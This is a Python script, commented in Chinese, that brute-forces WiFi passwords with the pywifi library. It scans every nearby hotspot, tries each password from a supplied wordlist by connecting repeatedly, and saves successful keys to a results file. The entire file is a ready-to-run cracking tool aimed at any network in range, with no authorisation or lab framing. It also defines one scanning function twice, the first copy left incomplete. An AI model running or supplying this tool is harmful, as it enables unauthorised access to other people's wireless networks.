from pywifi import *
import time
import sys

def main():
    #掃描時常
    scantimes = 3
    #單個密碼測試延遲
    testtimes = 15
    output = sys.stdout
    #結果檔案儲存路徑
    files = "TestRes.txt"
    #字典列表
    keys = open(sys.argv[1],"r").readlines()
    print ("|KEYS %s"%(len(keys)))
    #例項化一個pywifi物件
    wifi = PyWiFi()
    #選擇定一個網絡卡並賦值於iface
    iface = wifi.interfaces()[0]
    #通過iface進行一個時常為scantimes的掃描並獲取附近的熱點基礎配置
    scanres = scans(iface,scantimes)
    #統計附近被發現的熱點數量
    nums = len(scanres)
    print ("|SCAN GET %s"%(nums))
    print ("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s"%("-"*70,6,"WIFIID",18,"SSID OR BSSID",2,"N",4,"time",7,"signal",10,"KEYNUM",10,"KEY","="*70))
    #將每一個熱點資訊逐一進行測試
    for i,x in enumerate(scanres):
        #測試完畢後，成功的結果講儲存到files中
        res = test(nums-i,iface,x,keys,output,testtimes)
        if res:
            open(files,"a").write(res)
            
def scans(face,timeout):
    #開始掃描
    face.scan()

def scans(face,timeout):
    #開始掃描
    face.scan()
    time.sleep(timeout)
    #在若干秒後獲取掃描結果
    return face.scan_results()

def test(i,face,x,key,stu,ts):
    #顯示對應網路名稱，考慮到部分中文名嘖顯示bssid
    showID = x.bssid if len(x.ssid)>len(x.bssid) else x.ssid
    #迭代字典並進行爆破
    for n,k in enumerate(key):
        x.key = k.strip()
        #移除所有熱點配置
        face.remove_all_network_profiles()
        #講封裝好的目標嘗試連線
        face.connect(face.add_network_profile(x))
        #初始化狀態碼，考慮到用0會發生些邏輯錯誤
        code = 10
        t1 = time.time()
        #迴圈重新整理狀態，如果置為0則密碼錯誤，如超時則進行下一個
        while code!=0 :
            time.sleep(0.1)
            code = face.status()
            now = time.time()-t1
            if now>ts:
                break
            stu.write("\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s"%(6,i,18,showID,code,5,now,7,x.signal,10,len(key)-n,10,k.replace("\n","")))
            stu.flush()
            if code == 4:
                face.disconnect()
                return "%-*s| %s | %*s |%*s\n"%(20,x.ssid,x.bssid,3,x.signal,15,k)
    return False
